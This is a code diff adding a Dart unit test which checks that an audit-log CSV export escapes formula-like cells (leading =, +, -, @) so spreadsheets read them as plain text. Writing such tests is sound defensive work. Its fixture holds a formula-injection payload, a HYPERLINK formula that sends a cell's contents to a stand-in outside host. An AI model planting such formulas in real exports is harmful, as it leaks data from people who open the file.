@@ -48,4 +48,19 @@ void main() {
     expect(csv, contains('Ravi (owner),Rejected as owner (expense),,5000.00,not ours,e1'),
         reason: 'the step carries the amount');
   });
+
+  test('text that Excel would run as a formula is written as plain text', () {
+    final e = AuditEvent(
+        at: DateTime(2026, 11, 5, 10),
+        projectId: 'p',
+        by: 'u',
+        action: 'Expense cancelled',
+        item: '+91 98480 12345',
+        amount: -500,
+        note: '=HYPERLINK("http://x.example/?"&A1,"Click")',
+        recordId: 'e1');
+    final row = auditCsv([e], nameOf: (_) => '@ravi', siteName: {'p': '-Kompally'}).trim().split('\n')[1];
+    expect(row, startsWith("2026-11-05 10:00,'-Kompally,'@ravi,Expense cancelled,'+91 98480 12345,-500.00,"));
+    expect(row, contains(',"\'=HYPERLINK(""http://x.example/?""&A1,""Click"")",e1'));
+  });
 }
